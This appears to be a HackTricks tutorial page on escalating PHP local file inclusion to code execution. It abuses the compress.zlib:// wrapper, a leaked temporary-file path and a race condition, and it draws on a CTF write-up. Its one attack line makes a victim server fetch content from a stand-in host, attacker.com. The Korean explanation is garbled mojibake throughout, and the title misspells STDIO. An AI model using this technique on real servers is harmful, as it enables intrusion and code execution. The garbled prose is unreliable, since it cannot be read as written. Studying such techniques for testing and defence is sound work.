# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### `compress.zlib://` ë° `PHP_STREAM_PREFER_STDIO`

`PHP_STREAM_PREFER_STDIO` í”Œë˜ê·¸ì™€ í•¨ê»˜ `compress.zlib://` í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ì—´ë¦° íŒŒì¼ì€ ë‚˜ì¤‘ì— ì—°ê²°ë¡œ ë„ì°©í•˜ëŠ” ë°ì´í„°ë¥¼ ë™ì¼í•œ íŒŒì¼ì— ê³„ì† ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í˜¸ì¶œì„ ì˜ë¯¸í•©ë‹ˆë‹¤:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
http://attacker.com/fileì— ëŒ€í•œ ìš”ì²­ì„ ë³´ë‚¼ ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ ì„œë²„ëŠ” ìœ íš¨í•œ HTTP ì‘ë‹µìœ¼ë¡œ ìš”ì²­ì— ì‘ë‹µí•  ìˆ˜ ìˆìœ¼ë©°, ì—°ê²°ì„ ìœ ì§€í•˜ê³  ë‚˜ì¤‘ì— íŒŒì¼ì— ê¸°ë¡ë  ì¶”ê°€ ë°ì´í„°ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì •ë³´ëŠ” php-src ì½”ë“œì˜ main/streams/cast.cì˜ ì´ ë¶€ë¶„ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### Race Condition to RCE

[**ì´ CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)ëŠ” ì´ì „ì˜ íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ì—¬ í•´ê²°ë˜ì—ˆìŠµë‹ˆë‹¤.

ê³µê²©ìëŠ” **í”¼í•´ì ì„œë²„ê°€ ê³µê²©ìì˜ ì„œë²„ì—ì„œ íŒŒì¼ì„ ì½ëŠ” ì—°ê²°ì„ ì—´ë„ë¡** í•  ê²ƒì…ë‹ˆë‹¤ **`compress.zlib`** í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬.

**ì—°ê²°**ì´ ì¡´ì¬í•˜ëŠ” ë™ì•ˆ ê³µê²©ìëŠ” **ìƒì„±ëœ ì„ì‹œ íŒŒì¼ì˜ ê²½ë¡œë¥¼ ìœ ì¶œ**í•  ê²ƒì…ë‹ˆë‹¤ (ì„œë²„ì— ì˜í•´ ìœ ì¶œë¨).

**ì—°ê²°**ì´ ì—¬ì „íˆ ì—´ë ¤ ìˆëŠ” ë™ì•ˆ ê³µê²©ìëŠ” **ìì‹ ì´ ì œì–´í•˜ëŠ” ì„ì‹œ íŒŒì¼ì„ ë¡œë“œí•˜ëŠ” LFIë¥¼ ì´ìš©í•  ê²ƒì…ë‹ˆë‹¤**.

ê·¸ëŸ¬ë‚˜ ì›¹ ì„œë²„ì—ëŠ” **`<?`**ê°€ í¬í•¨ëœ íŒŒì¼ì„ ë¡œë“œí•˜ëŠ” ê²ƒì„ **ë°©ì§€í•˜ëŠ” ì²´í¬**ê°€ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” **ê²½ìŸ ì¡°ê±´**ì„ ì•…ìš©í•  ê²ƒì…ë‹ˆë‹¤. ì—¬ì „íˆ ì—´ë ¤ ìˆëŠ” ì—°ê²°ì—ì„œ **ê³µê²©ìëŠ”** **ì›¹ ì„œë²„ê°€** **ê¸ˆì§€ëœ ë¬¸ìê°€ í¬í•¨ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•œ í›„** **PHP í˜ì´ë¡œë“œë¥¼ ì „ì†¡í•  ê²ƒì…ë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ **ë‚´ìš©ì„ ë¡œë“œí•˜ê¸° ì „ì—**ì…ë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)ì—ì„œ ê²½ìŸ ì¡°ê±´ ë° CTF ì„¤ëª…ì„ í™•ì¸í•˜ì„¸ìš”.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
